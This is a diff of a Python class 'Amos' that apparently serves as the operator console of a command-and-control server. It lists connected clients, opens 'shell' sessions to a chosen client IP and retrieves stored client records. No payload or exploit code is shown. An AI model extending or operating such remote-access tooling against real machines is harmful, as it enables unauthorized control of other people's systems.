@@ -72,21 +72,22 @@ class Amos:
 
             if cmd == 'connected':
                 cmd = cmd.strip().lower()
+                response = []
                 for client_ip, client_id in http_server.RequestHandlerClass.connected_clients.items():
                     print(client_id, client_ip)
-                    
                     http_server.RequestHandlerClass.send_check_call_command(http_server.RequestHandlerClass, client_ip)
+                    response.append(self.esHandler.retrieve_connected_clients(client_ip))
+                
+                self.esHandler.tabulate_data(response)
                     
                     
-
             elif cmd.strip() == "":
                 pass 
 
-            elif cmd.startswith('shell'):
+            elif cmd.startswith('shell '):
 
                 client_ip = cmd.split(' ')[1]
                 #ip = http_server.RequestHandlerClass.get_client_ip(http_server.RequestHandlerClass, "5CvAcIoB-yjI_UK4Pk2W", self.esHandler)
-                #print(ip)
 
                 if client_ip in http_server.RequestHandlerClass.connected_clients:
                     http_server.RequestHandlerClass.selected_client_ip = client_ip
@@ -120,7 +121,12 @@ class Amos:
                     print("[-]Invalid input!!!")
 
 
-            elif cmd.startswith('get fields'):
+            elif 'get' in cmd:
+                client_id = cmd[4:]
+                self.esHandler.retrieve_client_document(client_id)
+
+
+            elif cmd.startswith('fields'):
                 cmd = cmd.split()
 
                 if len(cmd) == 4:
